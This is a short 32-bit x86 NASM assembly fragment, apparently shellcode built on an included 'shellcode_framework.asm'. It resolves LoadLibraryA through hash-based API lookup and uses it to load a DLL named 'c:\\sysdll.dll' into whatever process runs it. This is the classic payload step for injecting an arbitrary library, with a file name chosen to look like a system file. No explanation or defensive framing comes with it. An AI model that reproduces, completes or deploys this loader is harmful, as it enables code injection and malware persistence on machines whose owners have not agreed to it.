[bits 32]

[section .text]

_loadlibrarya_:
	pushad
	call _load_start_
	db 'LoadLibraryA',0
_load_start_:
	call _str2dw
	add esp,4h
	push eax
	call _GetFuncAddress
	add esp,4h
	call tag_dll
	db 'c:\\sysdll.dll',0
tag_dll:
	call eax
	popad
	ret
	
	%include "shellcode_framework.asm"